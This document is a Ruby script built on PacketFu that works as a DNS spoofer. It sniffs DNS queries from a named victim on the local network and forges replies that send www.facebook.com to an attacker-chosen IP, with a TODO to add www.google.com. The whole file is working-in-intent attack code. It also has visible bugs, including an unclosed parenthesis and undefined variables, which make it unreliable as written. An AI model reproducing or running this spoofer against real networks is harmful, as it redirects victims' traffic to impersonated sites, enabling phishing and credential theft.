#!/usr/bin/env ruby
require 'rubygems'
require 'packetfu'

class DNSSPoofer
    
    def initialize(spoof_ip, victim_ip, iface = "em1", spoof = false)
        @spoof_ip = spoof_ip
        @victim_ip = victim_ip
        @victim_mac = Utils.arp(victim_ip, :iface => iface)
        @interface = iface
        
        if spoof then
            start
        end
    end # initalize
    
    def send(packet)
        packet.to_w(@interface)
    end # send(packet)
    
    def start
        # Check if already spoofing
        if running then
            puts "Spoofer is already running."
            return
        end
        
        @running = true
        
        # Only capture DNS packets
        filter = "udp and port 53"
        
        cap = PacketFu::Capture.new(:iface => @interface, :start => true,
                        :promisc => true, :filter => filter, :save => true)
                        
        puts "DNS Packet sniffing starting..."
        
        # Start packet sniffing
        cap.stream.each do |pkt|
            @packet = PacketFu::Packet.parse(pkt)
            
            # Check if Query
            if @packet.payload[2] == 1 && @packet.payload[3] == 0 then
                @domain_name = get_domain(@packet.payload[12..-1]
                
                # Check if domain name field is empty
                if domain_name.nil? then
                    puts "Empty domain name field"
                    next
                end # domain_name.nil?
                
                puts "Domain name: #{@domain_name}"
                send_response
                
            end # if(@packet.payload[2] == 1 && @packet.payload[3] == 0
        end # cap stream.each do |pkt|
        
    end # start
    
    def get_domain(payload)
        domain_name = ""
        while(true)
            # Get payload len
            len = payload[0].to_i
            
            if len != 0 then
                domain_name += payload[1, len] + "."
                payload = payload[len + 1..-1]  
            else
                return domain_name = domain_name[0, domain.length - 1]
            end # if len != 0 then
        end # while(true)
    end # get_domain(payload)
    
    def send_response
        cfg = PacketFu::Utils.whoami?(:iface => @interface)
        
        # Create response packet
        udp_packet = PacketFu::UDPPacket.new(:config => cfg, 
                                :udp_src => @packet.udp_dst, :udp_dst => @packet.udp_src)
        udp_packet.eth_daddr = @victim_mac
        udp_packet.ip_daddr = @victim_ip
        udp_packet.ip_saddr = @packet.ip_daddr
        udp_packet.payload = @packet.payload[0, 2]
        
        udp_packet.payload += "\x81" + "\x80" + "\x00" + "\x01" + "\x00" + "\x01"
        udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x00"
        
        # For www.facebook.com
        if @domain_name == "www.facebook.com" then
            @domain_name.split('.').each do |part|
                udp_packet.payload += part.length.chr
                udp_packet.payload += part
            end # @domain_name.split('.').each do |part|
       
            udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01" + "\xc0" + "\x0c"
            udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01"
            # ttl
            udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x64"
            # data length
            udp_packet.payload += "\x00" + "\x04"
        end # if @domain_name == "www.facebook.com" then
        
        #-----------------------------------------------------------------------
        #TODO:
        # Need to do create packet for www.google.com
        #-----------------------------------------------------------------------
        
        # Address
        spoof_ip = @spoof_ip.split('.')
        udp_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('C*')
        
        udp_packet.recalc
   
        send(udp_packet)     
    end # send_response
end
